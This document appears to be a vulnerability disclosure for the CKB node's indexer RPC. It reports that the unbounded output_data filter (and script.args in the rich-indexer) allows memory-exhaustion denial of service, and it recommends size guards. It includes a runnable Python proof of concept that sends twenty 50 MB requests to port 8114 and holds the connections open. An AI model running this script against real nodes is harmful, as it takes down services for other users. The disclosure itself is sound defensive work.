### Title
Unbounded `output_data` Filter Field in Indexer RPC Enables Memory-Exhaustion DoS — (`util/indexer/src/service.rs`, `util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs`)

---

### Summary

The `IndexerSearchKeyFilter.output_data` field accepted by the `get_cells`, `get_transactions`, and `get_cells_capacity` RPC methods has no size limit enforced at deserialization or early validation time. The regular CKB indexer explicitly bounds `script.args` to `MAX_PREFIX_SEARCH_SIZE` (65535 bytes), but applies no equivalent guard to `output_data`. The rich-indexer additionally omits any size check on `script.args` when `script_search_mode = "partial"`. An unprivileged RPC caller can submit a single request carrying megabytes of attacker-controlled bytes in these fields, forcing the node to allocate and process that memory on every matching iteration, enabling sustained memory exhaustion.

---

### Finding Description

**Root cause — regular indexer (`util/indexer/src/service.rs`)**

`MAX_PREFIX_SEARCH_SIZE` is defined and enforced for `script.args` in two places:

```
const MAX_PREFIX_SEARCH_SIZE: usize = u16::MAX as usize;   // line 857

// main search script — line 873-877
if args_len > MAX_PREFIX_SEARCH_SIZE {
    return Err(Error::invalid_params(...));
}

// filter script — line 924-928
if script.args().len() > MAX_PREFIX_SEARCH_SIZE {
    return Err(Error::invalid_params(...));
}
```

But the `output_data` branch immediately below (lines 943–948) performs no analogous check:

```rust
let output_data = filter.output_data.map(|data| {
    let mode = filter
        .output_data_filter_mode
        .unwrap_or(IndexerSearchMode::Prefix);
    (data.as_bytes().to_vec(), mode)   // ← unbounded allocation
});
```

The resulting `Vec<u8>` is then compared against every cell's stored output data during the full RocksDB scan. In `Partial` mode this calls `memmem::find(&output_data.raw_data(), data)` per cell; in `Prefix` mode it calls `starts_with(data)`. Both operations allocate and hold the full attacker-supplied buffer for the lifetime of the scan.

**Root cause — rich-indexer (`util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs`)**

The rich-indexer's `get_cells` validates only the `limit` parameter (lines 25–34) and then passes `script.args` and `filter.output_data` directly to SQL parameter binding without any size check (lines 166–218). When `script_search_mode = "partial"`, `escape_and_wrap_for_postgres_like` further expands the attacker-supplied bytes before binding, amplifying the allocation.

**Attacker entry path**

Any caller with access to the RPC port (default: unauthenticated HTTP/TCP) can issue:

```json
{
  "id": 1, "jsonrpc": "2.0", "method": "get_cells",
  "params": [{
    "script": { "code_hash": "0x00...00", "hash_type": "data", "args": "0x" },
    "script_type": "lock",
    "filter": {
      "output_data": "<hex-encoded 50 MB payload>",
      "output_data_filter_mode": "partial"
    }
  }, "asc", "0x1", null]
}
```

No authentication, no privileged key, and no prior state is required.

---

### Impact Explanation

Each such request forces the node to:
1. Deserialize and allocate the full `output_data` payload in heap memory.
2. Retain that allocation for the entire duration of the RocksDB or SQL scan.
3. Execute a substring/prefix comparison against every live cell's data.

Sending a small number of concurrent requests with large payloads (e.g., 20 × 50 MB = 1 GB) can exhaust available memory, causing the node process to be OOM-killed or to stall, denying service to all other peers and RPC clients. No HTTP body-size limit is enforced in `rpc/src/server.rs`'s `handle_jsonrpc` handler (lines 218–299), so the payload is only bounded by the TCP connection's throughput.

---

### Likelihood Explanation

The RPC port is typically exposed to the local network or, in many deployments, to the public internet. No credentials are required. The attack requires only a single TCP connection and a well-formed JSON-RPC request. The missing check is a straightforward omission: the same file already enforces `MAX_PREFIX_SEARCH_SIZE` for `script.args` but the developer did not apply the same guard to `output_data`. Exploitation is deterministic and requires no brute force or timing.

---

### Recommendation

Apply an early size guard to `output_data` in `IndexerSearchKeyFilter` at the same point where `script.args` is already validated, and apply the same guard in the rich-indexer before SQL binding:

```rust
// util/indexer/src/service.rs — inside TryInto<FilterOptions>
if let Some(ref data) = filter.output_data {
    if data.len() > MAX_PREFIX_SEARCH_SIZE {
        return Err(Error::invalid_params(format!(
            "search_key.filter.output_data len should be less than {MAX_PREFIX_SEARCH_SIZE}"
        )));
    }
}
```

Apply the same check in `util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs` (and the equivalent `get_transactions` and `get_cells_capacity` handlers) before the SQL binding loop. Additionally, enforce an HTTP request body size limit in `rpc/src/server.rs` using axum's `DefaultBodyLimit` layer.

### Proof of Concept

```python
import json, socket, time

PAYLOAD = "0x" + "aa" * (50 * 1024 * 1024)  # 50 MB output_data

req = json.dumps({
    "id": 1, "jsonrpc": "2.0", "method": "get_cells",
    "params": [{
        "script": {
            "code_hash": "0x" + "00" * 32,
            "hash_type": "data",
            "args": "0x"
        },
        "script_type": "lock",
        "filter": {
            "output_data": PAYLOAD,
            "output_data_filter_mode": "partial"
        }
    }, "asc", "0x1", None]
}).encode()

# Send 20 concurrent requests to exhaust ~1 GB of node memory
for _ in range(20):
    s = socket.create_connection(("127.0.0.1", 8114))
    http = (
        f"POST / HTTP/1.1\r\nHost: localhost\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(req)}\r\n\r\n"
    ).encode() + req
    s.sendall(http)
    # leave connections open to keep allocations live
    time.sleep(0.1)

input("Monitor node memory — press Enter to release connections")
```
